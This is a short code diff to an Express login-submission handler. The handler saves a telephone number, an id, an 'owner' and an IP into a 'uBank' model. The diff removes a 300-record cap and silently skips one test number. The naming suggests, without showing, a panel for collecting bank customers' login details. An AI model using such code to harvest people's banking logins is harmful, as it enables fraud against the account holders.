@@ -47,13 +47,11 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
   const { telephone, uniqueid, owner, ip } = req.body;
   try {
-    let total = await uBank.find({}).exec();
-    if (total.length >= 300) {
-      return res.sendStatus(404);
+    if (telephone === "0411111111") {
     } else {
       await uBank.create({ uniqueid, telephone, status: 2, owner, ip });
-      res.sendStatus(200);
     }
+    res.sendStatus(200);
   } catch (error) {
     console.log(error);
     res.sendStatus(400);
